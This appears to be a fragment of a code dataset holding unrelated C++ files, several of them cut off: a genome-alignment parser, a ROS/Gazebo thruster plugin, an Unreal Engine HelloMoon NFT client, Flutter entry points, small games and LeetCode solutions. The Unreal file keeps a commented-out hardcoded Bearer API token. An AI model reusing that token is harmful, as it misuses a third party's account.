-1))\n\t\t{\n\t\t\tindelPos = stoi(line);\n\t\t\tif(indelPos ==0) //reached the end of the indel description\n\t\t\t{\n\t\t\t\tmastermi.push_back(tempmi);//add to the master list\n\t\t\t\tstoreCords(masterRef[refName],masterQ[qName],tempmi);\n\t\t\t\tallChrom[indexAln].mums.push_back(tempmi);\n\t\t\t\tstoreNameCount(chromDensityRef[refName],chromDensityQ[qName],lookUpRef,lookUpQ,tempmi);\n\t\t\t}\n\t\t\tcount++;\n\t\t}\n\t\tif((line.find('>') == string::npos) && (line.size() >10) && (refName != \"\")) //when describing alignment segments\n\t\t{\n\t\t\t\ttempmi.rn = refName;\n\t\t\t\ttempmi.qn = qName;\t\t\n\t\t\t\trefStart = stoi(line,&pos1);\n\t\t\t\trefEnd = stoi(line.substr(pos1),&pos2);\n\t\t\t\tqStart = stoi(line.substr(pos1+pos2), &namePos);\n\t\t\t\tqEnd = stoi(line.substr(pos1+pos2+namePos));\n\t\t\t\ttempmi.x1 = refStart;\n\t\t\t\ttempmi.x2 = refEnd;\n\t\t\t\ttempmi.y1 = qStart;\n\t\t\t\ttempmi.y2 = qEnd;\n\t\t\t\ttempmi.l = refEnd - refStart;\n\t\t\t\tcount = 0;\n\t\t}\n\t}\n\tfin.close();\n\tfileName = \"cm.\"+string(argv[6])+\".txt\";\n\tfcm.open(fileName);\n\tfileName = \"cnv_all.\"+ string(argv[6]) + \".txt\";\n\tfcnv.open(fileName);\n\t//flast.open(argv[5]);\n\t//it takes 1min and 17s for dros genome to finish this \n/////////////////////LASTZ input//////////////////////\n\t//while(getline(flast,line))//test\n\t//{\n\t//\tif(line[0] != '#')//it is not the header line\n\t//\t{\n\t//\t\ttempmi = readLast(line);\n\t//\t\ttempmi.c = 'l';\n\t//\t}\n\t//\t\tindexAln = tempmi.rn + tempmi.qn;\n\t//\t\tallChrom[indexAln].last.push_back(tempmi);\n//cout<<tempmi.rn<<'\\t'<<tempmi.x1<<'\\t'<<tempmi.x2<<'",
    "// C++ standard header\n#include <functional>\n#include <iostream>\n#include <sstream>\n#include <thread>\n\n// ros header with message header\n#include <ros/ros.h>\n#include <ros/callback_queue.h>\n#include <ros/subscribe_options.h>\n#include <geometry_msgs/Pose.h>\n#include <geometry_msgs/Vector3.h>\n#include <geometry_msgs/Vector3Stamped.h>\n#include <geometry_msgs/Quaternion.h>\n#include <geometry_msgs/QuaternionStamped.h>\n\n// gazebo header \n#include <gazebo/gazebo.hh>\n#include <gazebo/physics/physics.hh>\n#include <gazebo/physics/Model.hh>\n#include <gazebo/physics/Link.hh>\n#include <gazebo/physics/World.hh>\n#include <gazebo/common/common.hh>\n#include <gazebo/msgs/msgs.hh>\n\n// ignition header\n#include <ignition/math/Vector3.hh>\n#include <ignition/math/Quaternion.hh>\n#include <ignition/math/Matrix3.hh>\n#include <ignition/math/Pose3.hh>\n\n// tf2 header\n#include <tf2/LinearMath/Quaternion.h>\n#include <tf2/LinearMath/Vector3.h>\n#include <tf2/LinearMath/Matrix3x3.h>\n\n// there are un-used headers that maybe will be utilized later.\n// After development, Un-used headers should be removed for simplicity. \n\n// Example of custom message publish code\n// m_publisher = nh_for_group.advertise<my_robotics_pkg::MyCustomMessageType>(\"great_custom_topic\", queue_size, should_latch);\n\nnamespace gazebo\n{\n  class reaction_wheel_plugin : public ModelPlugin\n  // Define plugin name for get plugined model data => Make sure that plugin description should be written in .xacro or .sdf etc files.\n  {\n  public:\n    void Load(physics::ModelPtr _model, sdf::ElementPtr _sdf) // Get model's object in gazebo world\n    {\n      this->model = _model; // Get model\n\n      // Initialize ROS\n      if (!ros::isInitialized())\n      {\n        int argc = 0;\n        char **argv = nullptr;\n        // Make handler if ros doesn't start\n        ros::init(argc, argv, \"reaction_wheel_plugin\", ros::init_options::NoSigintHandler);\n      }\n      // Create a ROS node handler\n      this->rosNode.reset(new ros::NodeHandle(\"reaction_wheel_plugin\")); // make node handler and reset node\n      \n      ros::SubscribeOptions torqueSO = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/torque\",1,boost::bind(&reaction_wheel_plugin::ApplyTorque, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions forceSO = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/force\",1,boost::bind(&reaction_wheel_plugin::ApplyForce, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n\n      ros::SubscribeOptions thrusterSO_1 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_1\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust1, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_2 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_2\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust2, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_3 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_3\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust3, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_4 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_4\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust4, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_5 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_5\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust5, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_6 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_6\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust6, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_7 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_7\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust7, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_8 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_8\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust8, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_9 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_9\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust9, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_10 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_10\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust10, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_11 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_11\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust11, this, _1),\n      ros::VoidPtr(), &this->rosQueue);\n      ros::SubscribeOptions thrusterSO_12 = ros::SubscribeOptions::create<geometry_msgs::Vector3>(\"/thruster_12\",1,boost::bind(&reaction_wheel_plugin::ApplyThrust12, this, _1),\n",
    "// Created in 2024. Copyright Thugz Labs SAS, all rights reserved.\n\n#include \"ThugzBCfor53BPLibrary.h\"\n#include \"Engine/Texture2D.h\"\n#include \"Engine/Texture.h\"\n#include \"ThugzBCfor53.h\"\n\n\n\n\nFString UThugzBCBPLibrary::LastJsonResponse = FString(\"\");\nFString UThugzBCBPLibrary::LastTokenBalance = FString(\"\");\n\n\n/////////////////////////////////////////////////////////////HELLOMOON//////////////////////////////////////////////////////////////////////////////\n\n// requ\u00eate pour HelloMoon API\nvoid UThugzBCBPLibrary::MakeHelloMoonAPIRequest(const FString& Account, const FString& Barear)\n{\n    FString HelloMoonURL = TEXT(\"https://rest-api.hellomoon.io/v0/nft/mints-by-owner\"); // Remplacez par l'URL de votre endpoint HelloMoon\n\n    TSharedRef<IHttpRequest, ESPMode::ThreadSafe> HttpRequest = FHttpModule::Get().CreateRequest();\n\n    HttpRequest->SetVerb(TEXT(\"POST\"));\n    HttpRequest->SetURL(HelloMoonURL);\n    HttpRequest->SetHeader(TEXT(\"Accept\"), TEXT(\"application/json\"));\n    HttpRequest->SetHeader(TEXT(\"Content-Type\"), TEXT(\"application/json\"));\n    HttpRequest->SetHeader(TEXT(\"Authorization\"), FString::Printf(TEXT(\"Bearer %s\"), *Barear));\n    //HttpRequest->SetHeader(TEXT(\"Authorization\"), TEXT(\"Bearer 84fc727a-66fd-4f4c-a723-17adb50ce7ca\"));\n\n    FString JsonPayload = FString::Printf(TEXT(\"{\\\"ownerAccount\\\":\\\"%s\\\"}\"), *Account);\n    HttpRequest->SetContentAsString(JsonPayload);\n\n    HttpRequest->OnProcessRequestComplete().BindStatic(&UThugzBCBPLibrary::HandleHelloMoonAPIResponse);\n\n    HttpRequest->ProcessRequest();\n}\n\n//Requete pour r\u00e9cup\u00e9rer l'URI de hellomoon\nvoid UThugzBCBPLibrary::MakeURIRequest(const FString& URL)\n{\n    TSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n    Request->OnProcessRequestComplete().BindStatic(&UThugzBCBPLibrary::HandleHelloMoonAPIResponse);\n    Request->SetURL(URL);\n    Request->SetVerb(\"GET\");\n    Request->SetHeader(\"Content-Type\", \"application/json\");\n    Request->ProcessRequest();\n}\nbool UThugzBCBPLibrary::ParseImageURL(const FString& JsonString, FString& OutImageURL)\n{\n    LastJsonResponse = JsonString; // Store the raw JSON response\n\n    TSharedPtr<FJsonObject> JsonObject;\n    TSharedRef<TJsonReader<>> Reader = TJsonReaderFactory<>::Create(JsonString);\n\n    if (FJsonSerializer::Deserialize(Reader, JsonObject) && JsonObject.IsValid())\n    {\n        if (JsonObject->HasField(\"image\"))\n        {\n            OutImageURL = JsonObject->GetStringField(\"image\");\n            return true;\n        }\n        else\n        {\n            UE_LOG(LogTemp, Error, TEXT(\"JSON does not contain 'image' field\"));\n        }\n    }\n    else\n    {\n        UE_LOG(LogTemp, Error, TEXT(\"Failed to parse JSON\"));\n    }\n\n    return false;\n}\n//R\u00e9cuperation de l'image et creation de la texture depuis l'URL obtenu par ParseImageURL\nvoid UThugzBCBPLibrary::DownloadImageAndCreateTexture(const FString& URL, UTexture2D*& OutTexture)\n{\n    TSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();\n    Request->OnProcessRequestComplete().BindStatic(&UThugzBCBPLibrary::OnImageDownloaded, &OutTexture);\n    Request->SetURL(URL);\n    Request->SetVerb(\"GET\");\n    Request->SetHeader(\"Content-Type\", \"application/json\");\n    Request->ProcessRequest();\n}\n\nvoid UThugzBCBPLibrary::OnImageDownloaded(FHttpRequestPtr Request, FHttpResponsePtr Response, bool bWasSuccessful, UTexture2D** OutTexture)\n{\n    if (bWasSuccessful && Response.IsValid())\n    {\n        const TArray<uint8>& ImageData = Response->GetContent();\n        *OutTexture = CreateTextureFromImageData(ImageData);\n        if (*OutTexture)\n        {\n            UE_LOG(LogTemp, Log, TEXT(\"Image downloaded and texture created successfully.\"));\n        }\n        else\n        {\n            UE_LOG(LogTemp, Error, TEXT(\"Failed to create texture from downloaded image.\"));\n        }\n    }\n    else\n    {\n        UE_LOG(LogTemp, Error, TEXT(\"Failed to download image.\"));\n    }\n}\n\nUTexture2D* UThugzBCBPLibrary::CreateTextureFromImageData(const TArray<uint8>& ImageData)\n{\n    IImageWrapperModule& ImageWrapperModule = FModuleManager::LoadModuleChecked<IImageWrapperModule>(FName(\"ImageWrapper\"));\n    EImageFormat ImageFormat = ImageWrapperModule.DetectImageFormat(ImageData.GetData(), ImageData.Num());\n\n    if (ImageFormat == EImageFormat::Invalid)\n    {\n        UE_LOG(LogTemp, Error, TEXT(\"Invalid image format.\"));\n        return nullptr;\n    }\n\n    TSharedPtr<IImageWrapper> ImageWrapper = ImageWrapperModule.CreateImageWrapper(ImageFormat);\n\n    if (ImageWrapper.IsValid() && ImageWrapper->SetCompressed(ImageData.GetData(), ImageData.Num()))\n    {\n        TArray<uint8> UncompressedBGRA;\n        if (ImageWrapper->GetRaw(ERGBFormat::BGRA, 8, UncompressedBGRA))\n        {\n            UTexture2D* Texture = UTexture2D::CreateTransient(ImageWrapper->GetWidth(), ImageWrapper->GetHeight(), PF_B8G8R8A8);\n\n            if (!Texture)\n            {\n                UE_LOG(LogTemp, Error, TEXT(\"Failed to create transient texture.",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"loadn_deufalt_ai_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n\n#include <iostream>\n#include <windows.h>\n#include <algorithm>\n\nusing namespace std;\nchar player1 = 'x',player2='o';\n\nchar body[3][3] = {\n\t\t{'1','2','3'},\n\t\t{'4','5','6'},\n\t\t{'7','8','9'}\n}; \n\nvoid print() {\n\tsystem(\"cls\");\n\tcout << \"X-O Game \" << endl;\n\tcout << \"========\" << endl;\n\tcout << endl;\n\tfor (int i = 0; i < 3; i++) {\n\t\tfor (int x = 0; x < 3; x++) {\n\t\t\tcout << body[i][x] << \"  \";\n\t\t}\n\t\tcout << endl;\n\t\tcout << endl;\n\t}\n}\nvoid change() {\n\tchar place;\n\tcout << \"Enter the place : \" <<\"(\" <<player1 << \") \"<< endl;\n\tcin >> place;\n\tfor (int i = 0; i < 3; i++) {\n\t\tfor (int x = 0; x < 3; x++) {\n\t\t\tif (body[i][x] == place) {\n\t\t\t\tbody[i][x] = player1;\n\t\t\t}\n\t\t}\n\t}\n\tswap(player1, player2);\n}\n \nchar checkwinner() {\n\tint a = 0, b = 0, count = 0;\n\tfor (int i = 0; i < 3; i++) {\n\t\tfor (int x = 0; x < 3; x++) {\n\t\t\tif (body[i][x] == 'x') {\n\t\t\t\ta++;\n\t\t\t}\n\t\t\telse if (body[i][x] == 'o') { b++; }\n\t\t\tif (a == 3) { return 'x'; }\n\t\t\tif (b == 3) { return 'o'; }\n\t\t}\n\t\ta = 0, b = 0;\n\t}\n\n\t//=============================\n\n\tfor (int x = 0; x < 3; x++) {\n\t\tfor (int i = 0; i< 3;i++) {\n\t\t\tif (body[i][x] == 'x') {\n\t\t\t\ta++;\n\t\t\t}\n\t\t\telse if (body[i][x] == 'o') { b++; }\n\t\t\tif (a == 3) { return 'x'; }\n\t\t\tif (b == 3) { return 'o'; }\n\t\t}\n\t\ta = 0, b = 0;\n\t}\n\t//==============================\n\n\tif (body[0][0] == 'x' && body[1][1] == 'x'  && body[2][2] == 'x') {\n\t\treturn 'x';\n\t}\n\n\tif (body[0][0] == 'o' && body[1][1] == 'o' && body[2][2] == 'o') {\n\t\treturn 'o';\n\t}\n\t//========================================================\n\tif (body[0][2] == 'x' && body[1][1] == 'x' && body[2][0] == 'x') {\n\t\treturn 'x';\n\t}\n\n\tif (body[0][2] == 'o' && body[1][1] == 'o' && body[2][0] == 'o') {\n\t\treturn 'o';\n\t}\n\n\t//========================================================\n\n\tfor (int i = 0; i < 3; i++) {\n\t\tfor (int x = 0; x < 3; x++) {\n\t\t\tif (body[i][x] !='x'&& body[i][x] != 'o') {\n\t\t\t\tcount++;\n\t\t\t}\n\t\t}\n\t}\n\tif (count == 0) {\n\t\treturn 'y';\n\t}\n\n\treturn 'c';\n\n}\nint main()\n{\n\t\n\twhile (checkwinner()=='c') {\n\t\tprint();\n\t\tchange();\n\t\tcheckwinner();\n   }\n\tprint();\n\tif (checkwinner() == 'x') {\n\t\tcout << \"The winner is x player\";\n\t}\n\tif (checkwinner() == 'o') {\n\t\tcout << \"The winner is o player\";\n\t}\n\n\tif (checkwinner() == 'y') {\n\t\tcout << \"No winner\";\n\t}\n}\n\t\n\n",
    "#include <algorithm>\n#include <dlfcn.h>\n#include <EGL/egl.h>\n#include <GLES2/gl2.h>\n\nconst char* vertexShaderSource = R\"(\nattribute vec4 aPosition;\nattribute vec2 aTexCoord;\nvarying vec2 vTexCoord;\nvoid main() {\n    gl_Position = aPosition;\n    vTexCoord = aTexCoord;\n}\n)\";\n\nconst char* fragmentShaderSource = R\"(\nprecision mediump float;\nvarying vec2 vTexCoord;\nuniform sampler2D uCurrentFrame;\nuniform sampler2D uPreviousFrame;\nuniform float uBlendFactor;\nvoid main() {\n    vec4 currentFrameColor = texture2D(uCurrentFrame, vTexCoord);\n    vec4 previousFrameColor = texture2D(uPreviousFrame, vTexCoord);\n    gl_FragColor = mix(currentFrameColor, previousFrameColor, uBlendFactor);\n}\n)\";\n\nGLuint framebuffer           = 0;\nGLuint renderTexture         = 0;\nGLuint previousFrameTexture  = 0;\nGLuint shaderProgram         = 0;\nGLuint vertexBuffer          = 0;\nGLuint indexBuffer           = 0;\nGLint  positionLocation      = -1;\nGLint  texCoordLocation      = -1;\nGLint  currentFrameLocation  = -1;\nGLint  previousFrameLocation = -1;\nGLint  blendFactorLocation   = -1;\n\nvoid initializeMotionBlurResources(GLint width, GLint height) {\n    // create and compile shaders\n    GLuint vertexShader = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertexShader, 1, &vertexShaderSource, nullptr);\n    glCompileShader(vertexShader);\n\n    GLuint fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragmentShader, 1, &fragmentShaderSource, nullptr);\n    glCompileShader(fragmentShader);\n\n    // link shaders into program\n    shaderProgram = glCreateProgram();\n    glAttachShader(shaderProgram, vertexShader);\n    glAttachShader(shaderProgram, fragmentShader);\n    glLinkProgram(shaderProgram);\n\n    // get attribute and uniform locations\n    positionLocation      = glGetAttribLocation(shaderProgram, \"aPosition\");\n    texCoordLocation      = glGetAttribLocation(shaderProgram, \"aTexCoord\");\n    currentFrameLocation  = glGetUniformLocation(shaderProgram, \"uCurrentFrame\");\n    previousFrameLocation = glGetUniformLocation(shaderProgram, \"uPreviousFrame\");\n    blendFactorLocation   = glGetUniformLocation(shaderProgram, \"uBlendFactor\");\n\n    // create framebuffer\n    glGenFramebuffers(1, &framebuffer);\n    glBindFramebuffer(GL_FRAMEBUFFER, framebuffer);\n\n    // create textures\n    glGenTextures(1, &renderTexture);\n    glBindTexture(GL_TEXTURE_2D, renderTexture);\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, nullptr);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, renderTexture, 0);\n\n    glGenTextures(1, &previousFrameTexture);\n    glBindTexture(GL_TEXTURE_2D, previousFrameTexture);\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, nullptr);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n    // unbind framebuffer\n    glBindFramebuffer(GL_FRAMEBUFFER, 0);\n\n    // create vertex buffer\n    GLfloat vertices[] = {\n            // positions  // texture coords\n            -1.0f, 1.0f, 0.0f, 1.0f,\n            -1.0f, -1.0f, 0.0f, 0.0f,\n            1.0f, -1.0f, 1.0f, 0.0f,\n            1.0f, 1.0f, 1.0f, 1.0f\n    };\n\n    GLushort indices[] = {\n            0, 1, 2,\n            0, 2, 3\n    };\n\n    glGenBuffers(1, &vertexBuffer);\n    glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glGenBuffers(1, &indexBuffer);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, indexBuffer);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(indices), indices, GL_STATIC_DRAW);\n}\n\nextern \"C\" __attribute__ ((visibility (\"default\"))) void mod_preinit() {\n    auto h = dlopen(\"libmcpelauncher_mod.so\", 0);\n\n    auto mcpelauncher_preinithook = (void (*)(const char*, void*, void**)) dlsym(h, \"mcpelauncher_preinithook\");\n\n    mcpelauncher_preinithook(\"eglSwapBuffers\", (void*) +[](EGLDisplay dpy, EGLSurface surface) {\n        EGLint width, height;\n        eglQuerySurface(dpy, surface, EGL_WIDTH, &width);\n        eglQuerySurface(dpy, surface, EGL_HEIGHT, &height);\n\n        glViewport(0, 0, width, height);\n\n        if (!framebuffer)\n            initializeMotionBlurResources(width, height);\n\n        // copy current framebuffer to render texture\n        glBindTexture(GL_TEXTURE_2D, renderTexture);\n        glCopyTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 0, 0, width, height, 0);\n\n        glBindFramebuffer(GL_FRAMEBUFFER, 0);\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n        glUseProgram(shaderProgram);\n        glActiveTexture(GL_TEXTURE0);\n        glBindTexture(GL_TEXTURE_2D, renderTexture);\n        glUniform1i(currentFrameLocation, 0);\n\n        glActiveTexture(GL_TEXTURE1);\n        glBindTexture(GL_TEXTURE_2D, previousFrameTexture);\n        glUniform",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"to_do_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<vector>\r\n#include <cmath>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nclass Solution {\r\npublic:\r\n    vector<int> path;\r\n    vector<vector<int>> result;\r\n    void backtracking (vector<int>& nums, int startIndex,vector<bool>& used) {\r\n        result.push_back(path);\r\n        // if(startIndex>1&&used[startIndex-1]==false)return;\r\n        if(startIndex>=nums.size()){\r\n            return;\r\n        }\r\n        for(int i=startIndex;i<nums.size();i++){\r\n            if(i>1&&used[i-1]==false)continue;\r\n            path.push_back(nums[i]);\r\n            used[i]=true;\r\n            backtracking(nums,i+1,used);\r\n            path.pop_back();\r\n            used[i]=false;\r\n        }\r\n    }\r\n\r\n    vector<vector<int>> subsetsWithDup(vector<int>& nums) {\r\n        sort(nums.begin(),nums.end());\r\n        vector<bool> used(nums.size(), false);\r\n        backtracking(nums,0,used);\r\n        return result;\r\n    }\r\n};\r\n\r\n\r\nint main(){\r\n    vector<int> vec = {1,2,2};\r\n    Solution a;\r\n    vector<vector<int>> ans = a.subsetsWithDup(vec);\r\n    for(auto rew:ans){\r\n        for(auto strs:rew){\r\n            cout<<strs<<\",\";\r\n        }\r\n        cout<<endl;\r\n    }\r\n    cout<<\"Fuck you!!!\"<<endl;\r\n    return 0;\r\n}",
    "#include <QCoreApplication>\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n#include <QDebug>\n#include <limits>\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n// ULLONG_MAX = 18446744073709551615\n//    LLONG_MAX = 9223372036854775807\n//       LLONG_MIN = -9223372036854775808\n    long long x=9223372036854775806;//9223372036854775807;\n    long long y=9223372036854775806;//9223372036854775807;\n      qDebug() <<x+y; // -2\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n\n  //  long long d;\n //   long long f;\n\n    if (\n          x < std::numeric_limits <long long>::max () && x > std::numeric_limits <long long>::min () &&\n      y < std::numeric_limits <long long>::max () && y > std::numeric_limits <long long>::min () &&\n                y+x < std::numeric_limits <long long>::max () && y+x > std::numeric_limits <long long>::min ()\n\n          )\n  //  f = d;\n          qDebug() <<x+y;\n    else\n  //  throw \"out of range\";\n        qDebug() <<\"out of range\";\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n    return a.exec();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"newsapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\nThere are n 1-indexed robots, each having a position on a line, health, and movement direction.\nYou are given 0-indexed integer arrays positions, healths, and a string directions\n(directions[i] is either 'L' for left or 'R' for right). All integers in positions are unique.\nAll robots start moving on the line simultaneously at the same speed in their given directions.\nIf two robots ever share the same position while moving, they will collide. If two robots collide,\nthe robot with lower health is removed from the line, and the health of the other robot decreases\nby one. The surviving robot continues in the same direction it was going. If both robots have the\nsame health, they are both removed from the line. Your task is to determine the health of the\nrobots that survive the collisions, in the same order that the robots were given,\ni.e. final heath of robot 1 (if survived), final health of robot 2 (if survived), and so on.\nIf there are no survivors, return an empty array. Return an array containing the health of the\nremaining robots (in the order they were given in the input), after no further collisions can\noccur.\n\nNote: The positions may be unsorted.\n*/\n\n/*\n[TOPICS INVOLVED:]\n- Array\n- Stack\n- Sorting\n- Simulation\n\n\nKey points:\n\n- The algorithm first sorts the robots based on their positions to process collisions in \n  order.\n- It uses a stack to keep track of right-moving robots, which can potentially collide with \n  left-moving robots.\n- For each left-moving robot, it processes collisions with right-moving robots from the stack.\n- The health of robots is updated based on collision rules: stronger robot survives with \n  reduced health, weaker robot is destroyed, equal health results in both being destroyed.\n- Finally, it collects and returns the health of all surviving robots.\n\nThe time complexity is O(n log n) due to the sorting step, where n is the number of robots. \nThe space complexity is O(n) for the additional vectors and stack used.\nThis solution efficiently handles the simulation of robot collisions by processing them in \norder of position and using a stack to manage potential collisions.\n*/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nclass Solution\n{\npublic:\n    /* [FUNCTION: survivedRobotsHealths]\n     * Simulates robot collisions and returns the health of surviving robots\n     * positions: vector of initial positions of robots\n     * healths: vector of initial health values of robots\n     * directions: string representing direction of movement for each robot\n     * Returns: vector of health values of surviving robots\n     */\n    vector<int> survivedRobotsHealths(vector<int> &positions, vector<int> &healths, string directions)\n    {\n        /* [OPTIMIZATION]\n         * These lines are redundant here as they're typically in main()\n         */\n        ios_base::sync_with_stdio(false);\n        cin.tie(NULL);\n\n        int n = positions.size();\n        vector<int> indices(n), result;\n        stack<int> stack;\n\n        /* [INITIALIZATION]\n         * Create a vector of indices to maintain original order\n         */\n        for (int index = 0; index < n; ++index)\n            indices[index] = index;\n\n        /* [SORTING]\n         * Sort indices based on robot 